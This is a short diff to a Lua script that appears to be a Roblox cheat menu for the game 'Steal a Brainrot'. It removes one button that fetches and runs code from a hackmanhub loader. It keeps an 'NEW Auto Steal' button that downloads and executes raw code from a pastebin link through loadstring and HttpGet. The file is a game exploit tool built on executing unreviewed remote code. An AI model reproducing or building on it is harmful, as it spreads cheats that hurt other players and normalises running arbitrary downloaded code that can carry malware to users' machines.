@@ -7,10 +7,6 @@ local OwO = library:Window("Steal a Brainrot")
 
 local OwO1 = library:Window("Main2")
 
-OwO:Button("Open New GUI", function()
-loadstring(game:HttpGet("https://hackmanhub.pages.dev/loader.txt"))()
-  end)
-
 OwO:Button("NEW Auto Steal", function()
 loadstring(game:HttpGet("https://pastebin.com/raw/2WEXn2UR"))()
 end)
